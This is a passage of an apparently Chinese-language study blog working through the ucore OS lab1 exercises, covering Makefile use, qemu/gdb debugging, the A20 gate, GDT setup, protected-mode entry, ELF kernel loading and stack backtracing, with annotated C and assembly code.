...<br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SEG_TSS     5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> GD_TSS      ((SEG_TSS) &lt;&lt; 3)        <span class="hljs-comment">// task segment selector</span></span><br><span class="hljs-comment">/* gdt_init - initialize the default GDT and TSS */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">gdt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// set boot kernel stack and default SS0</span><br>    load_esp0((<span class="hljs-keyword">uintptr_t</span>)bootstacktop);<br>    ts.ts_ss0 = KERNEL_DS;<br><br>    <span class="hljs-comment">// initialize the TSS filed of the gdt</span><br>    gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="hljs-keyword">uintptr_t</span>)&amp;ts, <span class="hljs-keyword">sizeof</span>(ts), DPL_KERNEL);<br><br>    <span class="hljs-comment">// reload all segment registers</span><br>    lgdt(&amp;gdt_pd);<br><br>    <span class="hljs-comment">// load the TSS</span><br>    ltr(GD_TSS);<br>&#125;<br></code></pre></div></td></tr></table></figure><img src="../../image/ucore/image-20211221160818556.png" alt="image-20211221160818556" style="zoom: 67%;" /><img src="../../image/ucore/image-20211221161024855.png" alt="image-20211221161024855" style="zoom:67%;" /><h3 id="附2-make"><a href="#附2-make" class="headerlink" title="附2: make"></a>附2: make</h3><p><a href="https://www.gnu.org/software/make/manual/make.html#Special-Targets">Special Built-in Target Names</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Automatic-Variables-1">Automatic Variables</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Functions">Functions</a> | <a href="https://www.gnu.org/software/make/manual/make.html#Implicit-Rules">Using Implicit Rules</a>&amp;<a href="https://www.gnu.org/software/make/manual/make.html#Catalogue-of-Rules">Catalogue-of-Rules</a> | </p><ul><li>$(foreach var,list,text):  <code>foreach(var: list)</code> </li><li>$(if condition,then-part[,else-part])</li><li>$(filter pattern…,text)</li><li>$(basename names…)</li><li>The eval Function</li><li>含有<code>$(1)</code>这个的call function就不是最高一级的call</li><li><code>make --trace 2&gt;/dev/null</code> </li><li><code>=</code> vs. <code>:=</code> </li></ul><h2 id="几个练习"><a href="#几个练习" class="headerlink" title="几个练习"></a>几个练习</h2><h3 id="项目组成"><a href="#项目组成" class="headerlink" title="项目组成"></a><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1/lab1_2_2_files.html">项目组成</a></h3><h3 id="练习一"><a href="#练习一" class="headerlink" title="练习一"></a>练习一</h3><blockquote><p>理解通过<a href="https://www.gnu.org/software/make/manual/make.html">make</a>生成执行文件的过程</p></blockquote><ul><li><p>操作系统镜像文件ucore.img是如何一步一步生成的？(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)</p><ul><li>Makefile掌握不够的话根本看不懂在写什么</li></ul></li><li><p>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p><ul><li>最后两个字节是0x55,0xAA</li></ul></li><li><p>后面又开了一篇博客: <a href="./ucore_makefile.md">link</a> </p></li></ul><h3 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p>使用qemu执行并调试lab1中的软件</p></blockquote><ol><li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p><ul><li>直接将gdb连接到qemu, 断点也不用下直接停在第一条指令上</li><li>要注意的是此时<code>$pc($eip)</code>不是真实的地址, <code>(($cs&lt;&lt;4)+$eip)</code>才是</li></ul></li><li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p><ul><li>此时在bootloader中, 设置为<code>file obj/bootblock.o</code>和<code>b *0x7c00</code>即可(别忘了<code>continue</code>要不然就是第一个问题了)</li></ul></li><li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment">#改写Makefile文件</span><br><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$(QEMU)</span> -S -s -d in_asm -D <span class="hljs-variable">$(BINDIR)</span>/q.log -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null&quot;</span><br>    <span class="hljs-variable">$(V)</span>sleep 2<br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span><br></code></pre></div></td></tr></table></figure><p>在调用qemu时增加<code>-d in_asm -D q.log</code>参数，便可以将运行的汇编指令保存在q.log中。</p></li></ol><h3 id="练习三"><a href="#练习三" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>分析bootloader进入保护模式的过程.</p></blockquote><ul><li><p>为何开启A20，以及如何开启A20</p><ul><li><p>Intel早期的8086 CPU提供了20根地址线，但寄存器只有16位，所以使用<strong>段寄存器值 &lt;&lt; 4 + 段内偏移值</strong>的方法来访问到所有内存，但按这种方式来计算出的地址的最大值为1088KB，超过20根地址线所能表示的范围，会发生“回卷”（和整数溢出有点类似）。但下一代的基于Intel 80286 CPU的计算机系统提供了24根地址线，当CPU计算出的地址超过1MB时便<strong>不会发生回卷</strong>，而这就造成了<strong>向下不兼容</strong>。为了保持完全的向下兼容性，IBM在计算机系统上加个硬件逻辑来模仿早期的回绕特征，而这就是<strong>A20 Gate</strong>。</p></li><li><p>A20 Gate的方法是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它。当A20 地址线控制禁止时，则程序就像在8086中运行，1MB以上的地址不可访问；保护模式下A20地址线控制必须打开。A20控制打开后，内存寻址将不会发生回卷。</p></li><li><p>在当前环境中，所用到的键盘控制器8042的IO端口只有0x60和0x64两个端口。8042通过这些端口给键盘控制器或键盘发送命令或读取状态。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用于控制A20信号线的开启与否。</p></li><li><p>有关概念:</p><p>8042有4个寄存器：</p><ul><li>1个8-bit长的Input buffer；Write-Only；</li><li>1个8-bit长的Output buffer； Read-Only；</li><li>1个8-bit长的Status Register；Read-Only；</li><li>1个8-bit长的Control Register；Read/Write。</li></ul><p>有两个端口地址：60h和64h，有关对它们的读写操作描述如下：</p><ul><li>读60h端口，读output buffer</li><li>写60h端口，写input buffer</li><li>读64h端口，读Status Register</li><li>操作Control Register，首先要向64h端口写一个命令（20h为读命令，60h为写命令），然后根据命令从60h端口读出Control Register的数据或者向60h端口写入Control Register的数据（64h端口还可以接受许多其它的命令）。<br>如果要<strong>写output</strong>, 则向64h写入命令0d1h, 向input buf写入control register中命令的参数</li></ul><p>Status Register的定义（要用bit 0和bit 1）：</p><table><thead><tr><th>bit</th><th>meaning</th></tr></thead><tbody><tr><td>0</td><td>output register (60h) 中有数据</td></tr><tr><td><strong>1</strong></td><td><strong>input register (60h/64h) 有数据</strong></td></tr><tr><td>2</td><td>系统标志（上电复位后被置为0）</td></tr><tr><td>3</td><td>data in input register is command (1) or data (0)</td></tr><tr><td>4-7</td><td>(Nothing special)</td></tr></tbody></table></li></ul></li></ul><p><img src="https://i.loli.net/2021/11/15/o2X7OPRbzxvVeUS.png" alt="img"></p><ul><li><p>代码中的流程:</p><p><strong>读0x64端口(读Status Register), 等待第二位(标志input buffer是否为空)等于0<br>向64h发送0d1h命令(作用是写output port,即一个键盘控制器命令),<br>然后等待input buf为空时向0x60h写入control register的参数(即要输出在output port上的值)</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # Enable A20:<br>    #  For backwards compatibility with the earliest PCs, physical<br>    #  address line 20 is tied low, so that addresses higher than<br>    #  1MB wrap around to zero by default. This code undoes this.<br>seta20.1:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.1<br><br>    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64<br>    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#x27;s P2 port<br><br>seta20.2:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.2<br><br>    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60<br>    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#x27;s A20 bit(the 1 bit) to 1<br></code></pre></div></td></tr></table></figure><ul><li>如何初始化GDT表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lgdt gdtdesc<br># Bootstrap GDT<br>.p2align 2                                          # force 4 byte alignment<br>gdt:<br>    SEG_NULLASM                                     # null seg<br>    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel<br>    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel<br><br>gdtdesc:<br>    .word 0x17                                      # sizeof(gdt) - 1<br>    .long gdt                                       # address gdt<br>    <br># asm.h<br>#define STA_X       0x8     // Executable segment<br>#define STA_W       0x2     // Writeable (non-executable segments)<br>#define STA_R       0x2     // Readable (executable segments)<br></code></pre></div></td></tr></table></figure><ul><li>进入保护模式：通过将cr0寄存器PE位置1便开启了保护模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movl %cr0, %eax<br>orl $CR0_PE_ON, %eax<br>movl %eax, %cr0<br></code></pre></div></td></tr></table></figure><ul><li>通过长跳转更新cs的基地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ljmp $PROT_MODE_CSEG, $protcseg<br>.code32<br>protcseg:<br></code></pre></div></td></tr></table></figure><ul><li>设置段寄存器，并建立堆栈</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movw $PROT_MODE_DSEG, %ax<br>movw %ax, %ds<br>movw %ax, %es<br>movw %ax, %fs<br>movw %ax, %gs<br>movw %ax, %ss<br>movl $0x0, %ebp<br>movl $start, %esp<br></code></pre></div></td></tr></table></figure><ul><li>转到保护模式完成，进入boot主方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">call bootmain<br></code></pre></div></td></tr></table></figure><h3 id="练习四"><a href="#练习四" class="headerlink" title="练习四"></a>练习四</h3><blockquote><p>分析bootloader加载ELF格式的OS的过程。</p></blockquote><ul><li>IDE: Integrated Drive Electronics，它的本意是指把控制器与盘体集成在一起的硬盘驱动器，IDE是表示硬盘的传输接口。</li></ul><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><p><strong>分析bootloader加载ELF格式的OS的过程。</strong> </p><p>首先看readsect函数，<br><code>readsect</code>从设备的第secno扇区读取数据到dst位置</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readsect</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *dst, <span class="hljs-keyword">uint32_t</span> secno)</span> </span>&#123;<br>    waitdisk();<br><br>    outb(<span class="hljs-number">0x1F2</span>, <span class="hljs-number">1</span>);                         <span class="hljs-comment">// 设置读取扇区的数目为1</span><br>    outb(<span class="hljs-number">0x1F3</span>, secno &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F4</span>, (secno &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F5</span>, (secno &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F6</span>, ((secno &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xF</span>) | <span class="hljs-number">0xE0</span>);<br>        <span class="hljs-comment">// 上面四条指令联合制定了扇区号</span><br>        <span class="hljs-comment">// 在这4个字节线联合构成的32位参数中</span><br>        <span class="hljs-comment">//   29-31位强制设为1</span><br>        <span class="hljs-comment">//   28位(=0)表示访问&quot;Disk 0&quot;</span><br>        <span class="hljs-comment">//   0-27位是28位的偏移量</span><br>    outb(<span class="hljs-number">0x1F7</span>, <span class="hljs-number">0x20</span>);                      <span class="hljs-comment">// 0x20命令，读取扇区</span><br><br>    waitdisk();<br><br>    insl(<span class="hljs-number">0x1F0</span>, dst, SECTSIZE / <span class="hljs-number">4</span>);         <span class="hljs-comment">// 读取到dst位置，</span><br>                                            <span class="hljs-comment">// magic number = 4因为这里以DW为单位</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>readseg简单包装了readsect，可以从设备读取任意长度的内容。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readseg</span><span class="hljs-params">(<span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">uint32_t</span> count, <span class="hljs-keyword">uint32_t</span> offset)</span> </span>&#123;<br>    <span class="hljs-keyword">uintptr_t</span> end_va = va + count;<br><br>    va -= offset % SECTSIZE;<br><br>    <span class="hljs-keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// 加1因为0扇区被引导占用</span><br>    <span class="hljs-comment">// ELF文件从1扇区开始</span><br><br>    <span class="hljs-keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;<br>        readsect((<span class="hljs-keyword">void</span> *)va, secno);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在bootmain函数中，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">bootmain</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 首先读取ELF的头部</span><br>    readseg((<span class="hljs-keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span><br>    <span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;<br>        <span class="hljs-keyword">goto</span> bad;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><br>    <span class="hljs-comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表，</span><br>    <span class="hljs-comment">// 先将描述表的头地址存在ph</span><br>    ph = (struct proghdr *)((<span class="hljs-keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);<br>    eph = ph + ELFHDR-&gt;e_phnum;<br><br>    <span class="hljs-comment">// 按照描述表将ELF文件中数据载入内存</span><br>    <span class="hljs-keyword">for</span> (; ph &lt; eph; ph ++) &#123;<br>        readseg(ph-&gt;p_va &amp; <span class="hljs-number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);<br>    &#125;<br>    <span class="hljs-comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span><br>    <span class="hljs-comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span><br><br>    <span class="hljs-comment">// 根据ELF头部储存的入口信息，找到内核的入口</span><br>    ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="hljs-number">0xFFFFFF</span>))();<br><br>bad:<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8A00</span>);<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8E00</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习五"><a href="#练习五" class="headerlink" title="练习五"></a>练习五</h3><blockquote><p>实现函数调用堆栈跟踪函数</p></blockquote><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">发现并没有在这里提到stabs类型文件, 补充一下</p><ul><li>Stabs refers to a format for information that describes a program to a debugger</li><li>This debugging information describes features of the source file like <u>line numbsers, the types and scopes of variables, and function names, parameters, and scopes.</u> </li><li>generated by compiler into the ‘.s’ file</li><li><a href="https://www.sourceware.org/gdb/onlinedocs/stabs.pdf">documentation</a> </li></ul><p>ss:ebp指向的堆栈位置储存着caller的ebp，以此为线索可以得到所有使用堆栈的函数ebp。<br>ss:ebp+4指向caller调用时的eip，ss:ebp+8等是（可能的）参数。</p><p>输出中，堆栈最深一层为</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ebp:<span class="hljs-number">0x00007bf8</span> eip:<span class="hljs-number">0x00007d68</span> args:<span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00007c4f</span><br>    &lt;unknow&gt;: -- <span class="hljs-number">0x00007d67</span> --<br></code></pre></div></td></tr></table></figure><p>其对应的是第一个使用堆栈的函数，bootmain.c中的bootmain。<br>bootloader设置的堆栈从0x7c00开始，使用”call bootmain”转入bootmain函数。<br>call指令压栈，所以bootmain中ebp为0x7bf8。</p><p><strong>print_stackframe:</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">+|  栈底方向    | 高位地址</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |  参数3       |</span><br><span class="hljs-comment"> |  参数2       |</span><br><span class="hljs-comment"> |  参数1       |</span><br><span class="hljs-comment"> |  返回地址     |</span><br><span class="hljs-comment"> |  上一层[ebp]  | &lt;-------- [ebp]</span><br><span class="hljs-comment"> |  局部变量     |  低位地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">uint32_t</span> eip, ebp;<br>eip = read_eip();<br>ebp = read_ebp();<br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ebp != <span class="hljs-number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)<br>&#123;<br>    cprintf(<span class="hljs-string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;0x%08x &quot;</span>, ((<span class="hljs-keyword">uint32_t</span> *)ebp + <span class="hljs-number">2</span>)[j]);<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    print_debuginfo(eip - <span class="hljs-number">1</span>);<br>    eip = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">1</span>];<br>    ebp = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>需要注意的问题:</p><ul><li><p>gdb命令通过文件加载debuginfo, 包括源代码和函数位置, 一般我们直接使用gdb <em>filepath</em> -q直接进入调试界面, 而本实验先启动qemu(使用.img镜像文件), 然后gdb通过remote连接到qemu中, Makefile中指定的gdbinit文件可以指定一些初始命令.</p><p>这样, gdb没有任何debuginfo, 全靠远程端口给出信息, 所以我们可以在init文件中添加file命令加载符号信息</p></li></ul><h3 id="练习六"><a href="#练习六" class="headerlink" title="练习六"></a>练习六</h3><blockquote><p>完善中断初始化和处理</p></blockquote><ul><li><p>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p><ul><li><p>一个表项的结构如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Gate descriptors for interrupts and traps */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gatedesc</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// low 16 bits of offset in segment</span><br>    <span class="hljs-keyword">unsigned</span> gd_ss : <span class="hljs-number">16</span>;            <span class="hljs-comment">// segment selector</span><br>    <span class="hljs-keyword">unsigned</span> gd_args : <span class="hljs-number">5</span>;            <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br>    <span class="hljs-keyword">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;            <span class="hljs-comment">// reserved(should be zero I guess)</span><br>    <span class="hljs-keyword">unsigned</span> gd_type : <span class="hljs-number">4</span>;            <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br>    <span class="hljs-keyword">unsigned</span> gd_s : <span class="hljs-number">1</span>;                <span class="hljs-comment">// must be 0 (system)</span><br>    <span class="hljs-keyword">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;            <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br>    <span class="hljs-keyword">unsigned</span> gd_p : <span class="hljs-number">1</span>;                <span class="hljs-comment">// Present</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>该表项的大小为<code>16+16+5+3+4+1+2+1+16 == 8*8</code>bit，即<strong>8字节</strong>。</p></li><li><p>根据IDT表项的结构，我们可以得知，IDT表项的第二个成员<code>gd_ss</code>为段选择子，第一个成员<code>gd_off_15_0</code>和最后一个成员<code>gd_off_31_16</code>共同组成一个段内偏移地址。根据段选择子和段内偏移地址就可以得出中断处理程序的地址。</p></li></ul></li><li><p>编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init.</p><ul><li><p>具体实现如下，详细信息以注释的形式写入代码中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div 